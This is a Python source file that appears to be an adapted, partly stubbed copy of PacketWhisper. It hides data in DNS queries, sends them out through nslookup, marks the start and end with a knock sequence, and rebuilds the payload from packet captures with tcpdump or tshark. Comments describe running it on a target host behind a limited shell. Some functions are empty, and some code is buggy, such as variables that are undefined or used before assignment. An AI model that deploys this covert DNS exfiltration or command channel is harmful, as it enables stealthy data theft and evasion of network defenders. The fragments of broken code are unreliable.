from pathlib import Path
import os, subprocess, re, random, time, cloakify, decloakify

# Set name of knock sequence string (this is only used when transmitting Common FQDN ciphers)

gKnockSequenceFilename = "knockSequence.txt"
gCommonFQDNCipherSelected = False

gFilepathCommonFQDN = "ciphers/common_fqdn/"




#========================================================================
#
# CloakAndTransferFile()
# 
# High-level coordination function for encoding and transferring the 
# selected file.
# 
#========================================================================

def CloakAndTransferFile():

	# Reset this each time we pass through
	global gCommonFQDNCipherSelected 



#========================================================================
#
# SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile )
#
# Since Common Website ciphers only have the source IP address as a way
# to identify its queries from all the others on the network, I set 
# gCommonFQDNCipherSelected to True so that the code will transmit the
# knock sequence at beginning and end of payload, helps us pick out the
# transmitting host from the pcap later.
#
# Note: Since most environments are NAT'd at the perimeter (removing 
# client's IP information), this mode is generally only useful for 
# transferring data between systems connected to the same /24 local 
# subnetwork.
#
#========================================================================

def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):
	
	global gCommonFQDNCipherSelected


#========================================================================
#
# TransferCloakedFile( cloakedFile, queryDelay )
#
# Generates sequential DNS queries for each FQDN in the Cloaked file.
#
# Adds UTC datetimestamps before and after completion, can help identify
# where in the pcap to look for info if you're capturing large volumes of
# traffic.
#
#========================================================================

def TransferCloakedFile( cloakedFile, queryDelay ):

	print("")
	print("Broadcasting response...")
	print("")

	status = GenerateDNSQueries( cloakedFile,  queryDelay )



	return



#========================================================================
#
# GenerateDNSQueries( cloakedFile, queryDelay )
#
# Leverages nslookup on host OS. Seems lazy, and is, but also lets us 
# leverage nslookup's implementation which has consistent behavior across
# operating systems (timeouts, avoiding unwanted retries, caching, etc.)
#
# "But why not just use 'dnspython'?" Because it's one more thing to have
# to import, brings a lot of baggage with it, and that's not how I like 
# my operational tools to be structured. The way PacketWhisper is 
# structured, I can get it running on a limited shell host just by 
# tar'ing up the project and extracting on the target host.
#
# Adds a half-second delay between DNS queries to help address UDP out-of-order
# delivery race conditions, etc.
#
#========================================================================

def GenerateDNSQueries(cloakedFile, queryDelay, dns='localhost'):
    tmpAddrStr = ""
    byteCount = 0
    
    with open(cloakedFile, 'r') as fqdnFile:
        #print("Progress (bytes transmitted - patience is a virtue): ")
        for fqdn in fqdnFile:
            fqdnStr = fqdn.strip()
            # We don't care if the lookup fails, so carry on
            try:
                ret = subprocess.run(['nslookup', fqdnStr, dns], stdout=os.devnull, stderr=os.devnull)
                time.sleep(queryDelay)
            except:
                time.sleep(queryDelay)
            checkpoint = byteCount % 25
            if byteCount > 0 and checkpoint == 0:
                print(str(byteCount) + "bytes Transferred.")
            byteCount += 1
    
    return


#========================================================================
#
# ExtractDNSQueriesFromPCAP( pcapFile, osStr )
#
# Creates a textfile with all of the DNS queries (UDP Port 53). Makes a
# system call to either tcpdump or windump, depending on the OS selected
# by the user. 
#
#========================================================================

def ExtractDNSQueriesFromPCAP( pcapFile, osStr ):

	dnsQueriesFilename = "dnsQueries.txt"

	if ( osStr == "Linux" ):

		commandStr = "tcpdump -r " + pcapFile + " udp port 53 > " + dnsQueriesFilename

		os.system( commandStr )

	elif ( osStr == "Windows" ):
		pcapFile = "cloaked_command.pcap"
		commandStr = f'tshark.exe.lnk -r "{Path.cwd()}/{pcapFile}" udp.port==53 > "{dnsQueriesFilename}"'
		os.system( commandStr )

	return dnsQueriesFilename



#========================================================================
#
# ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag, isRandomized )
#
# The fun stuff. Identify the PacketWhisper FQDN ciphers in the 
# collection of DNS queries, and reconstruct the Cloakified payload file
# with the matches.
#
# cipherTag is the unique element association with some ciphers. For 
# Random Subdomain FQDN ciphers it's the domain name. For Common FQDNs
# it's the source IP address associated with the knock sequence. It
# provides additional context when extracting cipher strings from a
# pcap file, which reduces the risk of false matches corrupting results.
#
#========================================================================

def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag, isRandomized ):
	print('Extracting payload...')
	cloakedFilename = "cloaked.payload"

	with open( dnsQueriesFilename ) as queriesFile:
			queries = queriesFile.readlines()

	with open( cipherFilename ) as cipherFile:
			cipherStrings = cipherFile.readlines()


	cloakedFile = open( cloakedFilename, "w" ) 


	# Activate "Elegance Mode" here - We don't have to extract the cipher
	# string from the DNS query. Instead, we only need to know that a 
	# cipher string *appears* in the query. Then we can simply add the 
	# corresponding cipher string to the cloaked payload file, because
	# inference. \o/

	for dnsQuery in queries:
		for cipherElement in cipherStrings:


			# We're matching on any "A?" DNS queries that also contain the cipher element

			foundQuery1 = re.search(r"A " + cipherElement + "?", dnsQuery) #re.search(r"A\?\s*.+\." + cipherElement + "?", dnsQuery)
			
   
			# For Repeated cipher family, we add a tag as the first element of the FQDN
			# to identify duplicate requests. This search catches those.

			if not foundQuery1:

				foundQuery2 = re.search(r"A\?\s*.+\." + cipherElement + "?", dnsQuery)

			if foundQuery1 or foundQuery2:
				#print(re.search(r"A " + cipherElement + "?", dnsQuery)) #debug
				#print(dnsQuery)
				#print('query1: '+str(foundQuery1), ', query2: '+str(foundQuery2)) #debug
				

				# Now match those hits to DNS queries that also contain the cipher 
				# tag. This may seem redundant to the re.search() above, but since
				# the cipher tag may appear before or after that "A?" element, we
				# use a different regex base string ("IP ") that will always appear
				# before the possible positions of the cipher tag

				found = re.search(cipherTag, dnsQuery)#re.search(r"IP " + cipherTag + "", dnsQuery)#debug
				#print(found)#debug
				if found: 
					# Confirmed match, minimized the risk of "bad luck" false 
					# positives. Add the cipher element to the extracted cloaked 
					# file that we'll later pass to Decloakify()
					queryElements = dnsQuery.split()
					reqType = queryElements[11] #A, AAAA, ...
					srcIP = queryElements[2]
					# Don't write out duplicate subdomains if cipher was
					# randomized, since that means it's a duplicate DNS query
					if isRandomized and reqType == 'A':

						cloakedFile.write( cipherElement )
		
	queriesFile.close()
	cipherFile.close()
	cloakedFile.close()

	return cloakedFilename, srcIP





#========================================================================
#
# GetSourceIPViaKnockSequence( dnsQueriesFile )
#
# Extracts the source IP address of the system that queried for the 
# knock sequence. We then use that value as the cipher tag while
# extracting Common FQDN ciphers from the PCAP file, since otherwise
# we'd have no idea how to tell the difference between all those other 
# systems querying for common FQDNs. 
# 
#========================================================================

def GetSourceIPViaKnockSequence( dnsQueriesFilename ):

	# WARNING: This is a duplicate hardcoded value of the string found
	# in the file 'knockSequence.txt'. This is unclean. It will be fixed.

	knockSequenceStr = "camembert.google.com"

	sourceIPAddrStr = ""

	try:
		with open( dnsQueriesFilename ) as queriesFile:
    			queries = queriesFile.readlines()

		queriesFile.close()

	except:
		print("")
		print("!!! Oh noes! Problem reading '", dnsQueriesFile, "'")
		print("!!! Verify the location of the DNS queries file") 
		print("")
		return

	for dnsQuery in queries:

		found = re.search(r"A\? " + knockSequenceStr + "?", dnsQuery)

			# Found the knock sequence in the DNS queries
			# Extract and return the source IP address 

		if found:

			queryFields = dnsQuery.split()
			ipAddr = queryFields[ 2 ].split( '.' )
			sourceIPAddrStr = ipAddr[ 0 ] + "." + ipAddr[ 1 ] + "." + ipAddr[ 2 ] + "." + ipAddr[ 3 ]

			# DEBUG
			print(dnsQuery)
			print(sourceIPAddrStr)

			# Generally not a fan of returns within loops, but here we are...
			return sourceIPAddrStr
	
	return sourceIPAddrStr
